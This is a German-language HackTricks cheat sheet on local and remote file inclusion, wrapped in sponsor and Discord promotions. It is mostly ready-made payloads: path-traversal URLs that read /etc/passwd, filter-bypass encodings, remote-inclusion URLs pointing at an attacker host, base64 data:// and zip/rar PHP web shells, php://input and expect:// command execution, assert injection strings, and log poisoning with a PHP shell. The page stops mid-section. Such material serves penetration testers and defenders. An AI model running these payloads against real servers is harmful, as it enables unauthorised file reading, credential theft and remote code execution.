# Dateiinklusion/Pfadtraversierung

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking-Einblicke**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeitnachrichten und Einblicke auf dem Laufenden

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattformupdates informiert

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) und beginnen Sie noch heute mit Top-Hackern zusammenzuarbeiten!

## Dateiinklusion

**Remote-Dateiinklusion (RFI):** Die Datei wird von einem entfernten Server geladen (Am besten: Sie k√∂nnen den Code schreiben und der Server wird ihn ausf√ºhren). In PHP ist dies standardm√§√üig **deaktiviert** (**allow\_url\_include**).\
**Lokale Dateiinklusion (LFI):** Der Server l√§dt eine lokale Datei.

Die Verwundbarkeit tritt auf, wenn der Benutzer auf irgendeine Weise die Datei steuern kann, die vom Server geladen wird.

Verwundbare **PHP-Funktionen**: require, require\_once, include, include\_once

Ein interessantes Tool zur Ausnutzung dieser Verwundbarkeit: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessante - LFI2RCE-Dateien
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Durch die Kombination mehrerer \*nix LFI-Listen und das Hinzuf√ºgen weiterer Pfade habe ich diese erstellt:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Versuchen Sie auch, `/` durch `\` zu ersetzen.\
Versuchen Sie auch, `../../../../../` hinzuzuf√ºgen.

Eine Liste, die mehrere Techniken verwendet, um die Datei /etc/password zu finden (um zu √ºberpr√ºfen, ob die Schwachstelle vorhanden ist), finden Sie [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Zusammenf√ºhrung verschiedener Wortlisten:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Versuchen Sie auch, `/` durch `\` zu ersetzen.\
Versuchen Sie auch, `C:/` zu entfernen und `../../../../../` hinzuzuf√ºgen.

Eine Liste, die verschiedene Techniken verwendet, um die Datei /boot.ini zu finden (um zu √ºberpr√ºfen, ob die Schwachstelle vorhanden ist), finden Sie [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

√úberpr√ºfen Sie die LFI-Liste von Linux.

## Grundlegende LFI und Umgehungen

Alle Beispiele sind f√ºr Local File Inclusion, k√∂nnen aber auch auf Remote File Inclusion angewendet werden (Seite=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Traversalsequenzen ohne rekursive Entfernung
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null-Byte (%00)**

Umgehen Sie das Anh√§ngen weiterer Zeichen am Ende des bereitgestellten Strings (Umgehung von: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dies ist **seit PHP 5.4 gel√∂st**

### **Kodierung**

Sie k√∂nnten nicht standardm√§√üige Codierungen wie doppelte URL-Codierung (und andere) verwenden:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Aus vorhandenem Ordner

Vielleicht √ºberpr√ºft das Backend den Ordnerpfad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Erkunden von Dateisystemverzeichnissen auf einem Server

Das Dateisystem eines Servers kann rekursiv erkundet werden, um Verzeichnisse und nicht nur Dateien zu identifizieren, indem bestimmte Techniken angewendet werden. Dieser Prozess beinhaltet das Bestimmen der Verzeichnistiefe und das √úberpr√ºfen auf das Vorhandensein bestimmter Ordner. Im Folgenden wird eine detaillierte Methode zur Erreichung dieses Ziels beschrieben:

1. **Bestimmen der Verzeichnistiefe:** Ermitteln Sie die Tiefe Ihres aktuellen Verzeichnisses, indem Sie erfolgreich die Datei `/etc/passwd` abrufen (falls der Server auf Linux basiert). Eine Beispiel-URL k√∂nnte wie folgt strukturiert sein und eine Tiefe von drei anzeigen:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Ordner √ºberpr√ºfen:** H√§ngen Sie den Namen des verd√§chtigten Ordners (z. B. `private`) an die URL an, navigieren Sie dann zur√ºck zu `/etc/passwd`. Die zus√§tzliche Verzeichnisebene erfordert eine Erh√∂hung der Tiefe um eins:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretiere die Ergebnisse:** Die Antwort des Servers zeigt an, ob der Ordner existiert:
   * **Fehler / Keine Ausgabe:** Der Ordner `private` existiert wahrscheinlich nicht an der angegebenen Stelle.
   * **Inhalt von `/etc/passwd`:** Die Existenz des Ordners `private` wird best√§tigt.
4. **Rekursive Erkundung:** Entdeckte Ordner k√∂nnen weiterhin auf Unterordner oder Dateien mit derselben Technik oder traditionellen Methoden zur lokalen Dateieinbindung (LFI) √ºberpr√ºft werden.

Um Verzeichnisse an verschiedenen Orten im Dateisystem zu erkunden, passe das Payload entsprechend an. Zum Beispiel, um zu √ºberpr√ºfen, ob `/var/www/` ein Verzeichnis `private` enth√§lt (unter der Annahme, dass das aktuelle Verzeichnis eine Tiefe von 3 hat), verwende:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Pfadk√ºrzungstechnik**

Die Pfadk√ºrzung ist eine Methode, die verwendet wird, um Dateipfade in Webanwendungen zu manipulieren. Oft wird sie eingesetzt, um auf eingeschr√§nkte Dateien zuzugreifen, indem bestimmte Sicherheitsma√ünahmen umgangen werden, die zus√§tzliche Zeichen am Ende von Dateipfaden anh√§ngen. Das Ziel besteht darin, einen Dateipfad zu erstellen, der, einmal durch die Sicherheitsma√ünahme ver√§ndert, immer noch auf die gew√ºnschte Datei zeigt.

In PHP k√∂nnen verschiedene Darstellungen eines Dateipfads aufgrund der Natur des Dateisystems als √§quivalent betrachtet werden. Zum Beispiel:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` und `/etc/passwd/` werden alle als derselbe Pfad behandelt.
* Wenn die letzten 6 Zeichen `passwd` sind, √§ndert das Anh√§ngen eines `/` (was `passwd/` ergibt) nicht die Zieldatei.
* Ebenso wird, wenn `.php` an einen Dateipfad angeh√§ngt wird (wie `shellcode.php`), das Hinzuf√ºgen von `/.` am Ende die aufgerufene Datei nicht ver√§ndern.

Die bereitgestellten Beispiele zeigen, wie die Pfadk√ºrzung genutzt werden kann, um auf `/etc/passwd` zuzugreifen, ein h√§ufiges Ziel aufgrund seines sensiblen Inhalts (Benutzerkontoinformationen):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In diesen Szenarien k√∂nnte die Anzahl der erforderlichen Traversals etwa 2027 betragen, aber diese Zahl kann je nach Konfiguration des Servers variieren.

* **Verwendung von Punktesegmenten und zus√§tzlichen Zeichen**: Traversierungssequenzen (`../`) in Kombination mit zus√§tzlichen Punktesegmenten und Zeichen k√∂nnen verwendet werden, um das Dateisystem zu navigieren und dabei angeh√§ngte Zeichenfolgen des Servers effektiv zu ignorieren.
* **Ermittlung der erforderlichen Anzahl von Traversals**: Durch Ausprobieren kann man die genaue Anzahl von `../`-Sequenzen finden, die ben√∂tigt werden, um zum Stammverzeichnis und dann zu `/etc/passwd` zu navigieren, wodurch sichergestellt wird, dass angeh√§ngte Zeichenfolgen (wie `.php`) neutralisiert werden, aber der gew√ºnschte Pfad (`/etc/passwd`) intakt bleibt.
* **Beginn mit einem falschen Verzeichnis**: Es ist eine g√§ngige Praxis, den Pfad mit einem nicht existierenden Verzeichnis zu beginnen (wie `a/`). Diese Technik wird als Vorsichtsma√ünahme verwendet oder um die Anforderungen der Pfadanalyselogik des Servers zu erf√ºllen.

Bei der Verwendung von Pfadtrunkierungstechniken ist es entscheidend, das Pfadanalysenverhalten des Servers und die Dateisystemstruktur zu verstehen. Jedes Szenario erfordert m√∂glicherweise einen anderen Ansatz, und Tests sind oft erforderlich, um die effektivste Methode zu finden.

**Diese Schwachstelle wurde in PHP 5.3 behoben.**

### **Filterumgehungs-Tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote-Dateieinschluss

In PHP ist dies standardm√§√üig deaktiviert, da **`allow_url_include`** auf **Aus** gesetzt ist. Es muss auf **Ein** gesetzt sein, damit es funktioniert, und in diesem Fall k√∂nnten Sie eine PHP-Datei von Ihrem Server einbinden und RCE erhalten:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Wenn aus irgendeinem Grund **`allow_url_include`** **aktiviert** ist, aber PHP den Zugriff auf externe Webseiten **filtert**, [gem√§√ü diesem Beitrag](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), k√∂nnten Sie beispielsweise das data-Protokoll mit Base64 verwenden, um einen b64 PHP-Code zu decodieren und RCE zu erhalten:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
In dem vorherigen Code wurde das abschlie√üende `+.txt` hinzugef√ºgt, weil der Angreifer einen String ben√∂tigte, der mit `.txt` endet. So endet der String damit und nach dem b64-Decodieren wird dieser Teil nur M√ºll zur√ºckgeben und der echte PHP-Code wird eingeschlossen (und folglich ausgef√ºhrt).
{% endhint %}

Ein weiteres Beispiel **ohne Verwendung des `php://`-Protokolls** w√§re:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Stammelement

In Python in einem Code wie diesem:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Wenn der Benutzer einen **absoluten Pfad** an **`file_name`** √ºbergibt, wird der **vorherige Pfad einfach entfernt**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Es ist das beabsichtigte Verhalten gem√§√ü [der Dokumentation](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Wenn ein Bestandteil ein absoluter Pfad ist, werden alle vorherigen Bestandteile verworfen und das Verkn√ºpfen wird vom absoluten Pfadbestandteil fortgesetzt.

## Java Verzeichnisse auflisten

Es scheint, dass bei einem Pfadtraversal in Java und wenn Sie **nach einem Verzeichnis fragen** anstelle einer Datei, eine **Auflistung des Verzeichnisses zur√ºckgegeben wird**. Dies wird in anderen Sprachen nicht passieren (soweit ich wei√ü).

## Top 25 Parameter

Hier ist eine Liste der 25 wichtigsten Parameter, die anf√§llig f√ºr lokale Dateieinschluss (LFI) sein k√∂nnten (von [diesem Link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI mit PHP-Wrappern & Protokollen

### php://filter

PHP-Filter erm√∂glichen grundlegende **√Ñnderungsvorg√§nge an den Daten** vor dem Lesen oder Schreiben. Es gibt 5 Kategorien von Filtern:

* [String-Filter](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Entfernt Tags aus den Daten (alles zwischen "<" und ">" Zeichen)
* Beachten Sie, dass dieser Filter aus den modernen Versionen von PHP verschwunden ist
* [Konversionsfilter](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Wandelt in eine andere Codierung um (`convert.iconv.<input_enc>.<output_enc>`). Um die **Liste aller unterst√ºtzten Codierungen** zu erhalten, f√ºhren Sie im Terminal aus: `iconv -l`

{% hint style="warning" %}
Durch den Missbrauch des `convert.iconv.*` Konversionsfilters k√∂nnen Sie **beliebigen Text generieren**, der n√ºtzlich sein k√∂nnte, um beliebigen Text zu schreiben oder eine Funktion wie das Einbinden von beliebigem Text zu erstellen. Weitere Informationen finden Sie unter [**LFI2RCE √ºber PHP-Filter**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Kompressionsfilter](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Komprimiert den Inhalt (n√ºtzlich, wenn viele Informationen exfiltriert werden)
* `zlib.inflate`: Dekomprimiert die Daten
* [Verschl√ºsselungsfilter](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Veraltet
* `mdecrypt.*` : Veraltet
* Andere Filter
* Wenn Sie in PHP `var_dump(stream_get_filters());` ausf√ºhren, finden Sie ein paar **unerwartete Filter**:
* `consumed`
* `dechunk`: kehrt die HTTP-Chunk-Codierung um
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
Der Teil "php://filter" ist nicht case sensitive.
{% endhint %}

### Verwendung von PHP-Filtern als Orakel zum Lesen beliebiger Dateien

In [**diesem Beitrag**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) wird eine Technik vorgeschlagen, um eine lokale Datei zu lesen, ohne die Ausgabe vom Server zur√ºckzuerhalten. Diese Technik basiert auf einer **booleschen Exfiltration der Datei (Zeichen f√ºr Zeichen) unter Verwendung von PHP-Filtern** als Orakel. Dies liegt daran, dass PHP-Filter verwendet werden k√∂nnen, um einen Text gro√ü genug zu machen, um PHP eine Ausnahme ausl√∂sen zu lassen.

Im Originalbeitrag finden Sie eine ausf√ºhrliche Erkl√§rung der Technik, aber hier ist eine kurze Zusammenfassung:

* Verwenden Sie den Codec **`UCS-4LE`**, um das f√ºhrende Zeichen des Textes am Anfang zu belassen und die Gr√∂√üe des Strings exponentiell zu erh√∂hen.
* Dies wird verwendet, um einen **Text so gro√ü zu generieren, dass PHP einen Fehler ausl√∂st, wenn der Anfangsbuchstabe richtig geraten wird**.
* Der **dechunk**-Filter wird **alles entfernen, wenn das erste Zeichen kein Hexadezimalwert ist**, sodass wir wissen, ob das erste Zeichen hexadezimal ist.
* Dies, in Kombination mit dem vorherigen (und anderen Filtern, die je nach geratenem Buchstaben verwendet werden), erm√∂glicht es uns, einen Buchstaben am Anfang des Textes zu erraten, indem wir sehen, wann wir genug Transformationen durchf√ºhren, um sicherzustellen, dass es sich nicht mehr um ein hexadezimales Zeichen handelt. Denn wenn es hexadezimal ist, wird dechunk es nicht l√∂schen und die anf√§ngliche Bombe wird einen PHP-Fehler ausl√∂sen.
* Der Codec **convert.iconv.UNICODE.CP930** wandelt jeden Buchstaben in den folgenden um (also nach diesem Codec: a -> b). Dies erm√∂glicht es uns zu entdecken, ob der erste Buchstabe ein `a` ist, zum Beispiel, weil wenn wir 6 Mal diesen Codec anwenden a->b->c->d->e->f->g, ist der Buchstabe nicht mehr ein hexadezimales Zeichen, daher l√∂scht dechunk es nicht und der PHP-Fehler wird ausgel√∂st, weil er sich mit der anf√§nglichen Bombe multipliziert.
* Durch die Verwendung anderer Transformationen wie **rot13** am Anfang ist es m√∂glich, andere Zeichen wie n, o, p, q, r zu leaken (und andere Codecs k√∂nnen verwendet werden, um andere Buchstaben in den Hex-Bereich zu verschieben).
* Wenn der anf√§ngliche Buchstabe eine Zahl ist, muss sie base64-codiert werden und die ersten 2 Buchstaben geleakt werden, um die Zahl zu leaken.
* Das endg√ºltige Problem besteht darin zu sehen, **wie mehr als der anf√§ngliche Buchstabe geleakt werden kann**. Durch die Verwendung von Ordnungsspeicherfiltern wie **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** ist es m√∂glich, die Reihenfolge der Zeichen zu √§ndern und andere Buchstaben des Textes an die erste Position zu bringen.
* Und um **weitere Daten** zu erhalten, besteht die Idee darin, **am Anfang 2 Bytes Junk-Daten zu generieren** mit **convert.iconv.UTF16.UTF16**, dann **UCS-4LE** anzuwenden, um es mit den n√§chsten 2 Bytes zu **verkn√ºpfen**, und die Daten bis zu den Junk-Daten zu **l√∂schen** (dies entfernt die ersten 2 Bytes des urspr√ºnglichen Textes). Fahren Sie fort, dies zu tun, bis Sie das gew√ºnschte Bit zum Leaken erreichen.

Im Beitrag wurde auch ein Tool geleakt, um dies automatisch durchzuf√ºhren: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Dieser Wrapper erm√∂glicht den Zugriff auf Dateideskriptoren, die der Prozess ge√∂ffnet hat. Potenziell n√ºtzlich, um den Inhalt ge√∂ffneter Dateien zu exfiltrieren:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Du kannst auch **php://stdin, php://stdout und php://stderr** verwenden, um auf die **Dateideskriptoren 0, 1 und 2** jeweils zuzugreifen (nicht sicher, wie dies bei einem Angriff n√ºtzlich sein k√∂nnte)

### zip:// und rar://

Lade eine Zip- oder Rar-Datei mit einer PHPShell hoch und greife darauf zu.\
Um das rar-Protokoll missbrauchen zu k√∂nnen, **muss es speziell aktiviert sein**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

Die `data://`-Methode erm√∂glicht es, Daten direkt in die URL einzubetten, anstatt auf eine externe Datei zu verweisen. Dies kann f√ºr Angriffe auf Dateieinschl√ºsse verwendet werden, um b√∂sartigen Code einzuschleusen.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Beachten Sie, dass dieses Protokoll durch PHP-Konfigurationen **`allow_url_open`** und **`allow_url_include`** eingeschr√§nkt ist.

### expect://

Expect muss aktiviert sein. Sie k√∂nnen Code mit folgendem ausf√ºhren:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### Eingabe://

Geben Sie Ihr Payload in den POST-Parametern an:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Eine `.phar`-Datei kann genutzt werden, um PHP-Code auszuf√ºhren, wenn eine Webanwendung Funktionen wie `include` f√ºr das Laden von Dateien verwendet. Der unten bereitgestellte PHP-Code-Schnipsel zeigt die Erstellung einer `.phar`-Datei:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Um die Datei `.phar` zu kompilieren, sollte der folgende Befehl ausgef√ºhrt werden:
```bash
php --define phar.readonly=0 create_path.php
```
Bei der Ausf√ºhrung wird eine Datei mit dem Namen `test.phar` erstellt, die potenziell zur Ausnutzung von Local File Inclusion (LFI)-Schwachstellen verwendet werden k√∂nnte.

In F√§llen, in denen die LFI nur Dateilesevorg√§nge ohne Ausf√ºhrung des PHP-Codes innerhalb durchf√ºhrt, beispielsweise √ºber Funktionen wie `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` oder `filesize()`, k√∂nnte versucht werden, eine Deserialisierungsschwachstelle auszunutzen. Diese Schwachstelle ist mit dem Lesen von Dateien √ºber das `phar`-Protokoll verbunden.

F√ºr ein detailliertes Verst√§ndnis der Ausnutzung von Deserialisierungsschwachstellen im Kontext von `.phar`-Dateien siehe das unten verlinkte Dokument:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Weitere Protokolle

√úberpr√ºfen Sie weitere m√∂gliche [**Protokolle, die hier eingef√ºgt werden k√∂nnen**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory und php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî Schreiben im Speicher oder in einer tempor√§ren Datei (nicht sicher, wie dies bei einem Dateieinschlussangriff n√ºtzlich sein kann)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Zugriff auf das lokale Dateisystem
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Zugriff auf HTTP(s)-URLs
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Zugriff auf FTP(s)-URLs
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Kompressions-Streams
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Suchen von Pfadnamen, die zu einem Muster passen (gibt nichts Druckbares zur√ºck, daher hier nicht wirklich n√ºtzlich)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Audio-Streams (nicht n√ºtzlich zum Lesen beliebiger Dateien)

## LFI √ºber PHP's 'assert'

Local File Inclusion (LFI)-Risiken in PHP sind besonders hoch, wenn es um die Funktion 'assert' geht, die Code in Zeichenfolgen ausf√ºhren kann. Dies ist besonders problematisch, wenn Eingaben mit Verzeichnistraversierungszeichen wie ".." √ºberpr√ºft, aber nicht ordnungsgem√§√ü bereinigt werden.

Beispielsweise k√∂nnte PHP-Code so gestaltet sein, um Verzeichnistraversierung zu verhindern:
```bash
assert("strpos('$file', '..') === false") or die("");
```
W√§hrend dies darauf abzielt, Traversierung zu stoppen, schafft es unbeabsichtigt einen Vektor f√ºr Code-Injektion. Um dies auszunutzen und Dateiinhalte zu lesen, k√∂nnte ein Angreifer Folgendes verwenden:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Ebenso k√∂nnte man zur Ausf√ºhrung beliebiger Systembefehle Folgendes verwenden:
```plaintext
' and die(system("id")) or '
```
Es ist wichtig, diese Payloads **URL-codiert**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking-Einblicke**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattform-Updates informiert

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit Top-Hackern zusammenzuarbeiten!

## PHP Blind Path Traversal

{% hint style="warning" %}
Diese Technik ist relevant in F√§llen, in denen Sie den Dateipfad einer PHP-Funktion **kontrollieren**, die auf eine Datei zugreifen wird, deren Inhalt Sie jedoch nicht sehen werden (wie ein einfacher Aufruf von **`file()`**), aber der Inhalt nicht angezeigt wird.
{% endhint %}

In [**diesem unglaublichen Beitrag**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wird erkl√§rt, wie ein blinder Pfadtraversal √ºber PHP-Filter missbraucht werden kann, um den Inhalt einer Datei √ºber ein Fehlerorakel zu **exfiltrieren**.

Zusammenfassend wird die Technik verwendet, um die Datei mit der **"UCS-4LE"-Codierung** so **gro√ü** zu machen, dass die **PHP-Funktion, die die Datei √∂ffnet**, einen **Fehler ausl√∂st**.

Dann wird zur Offenlegung des ersten Zeichens der Filter **`dechunk`** zusammen mit anderen wie **base64** oder **rot13** verwendet, und schlie√ülich werden die Filter **convert.iconv.UCS-4.UCS-4LE** und **convert.iconv.UTF16.UTF-16BE** verwendet, um **andere Zeichen am Anfang zu platzieren und sie preiszugeben**.

**Anf√§llige Funktionen k√∂nnten sein**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (nur Ziel schreibgesch√ºtzt damit)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

F√ºr technische Details √ºberpr√ºfen Sie den genannten Beitrag!

## LFI2RCE

### Remote File Inclusion

Wie zuvor erkl√§rt, [**folgen Sie diesem Link**](./#remote-file-inclusion).

### √úber Apache/Nginx-Logdatei

Wenn der Apache- oder Nginx-Server anf√§llig f√ºr LFI ist, k√∂nnten Sie versuchen, auf **`/var/log/apache2/access.log` oder `/var/log/nginx/access.log`** zuzugreifen, setzen Sie innerhalb des **User-Agent** oder innerhalb eines **GET-Parameters** eine PHP-Shell wie **`<?php system($_GET['c']); ?>`** und inkludieren Sie diese Datei

{% hint style="warning" %}
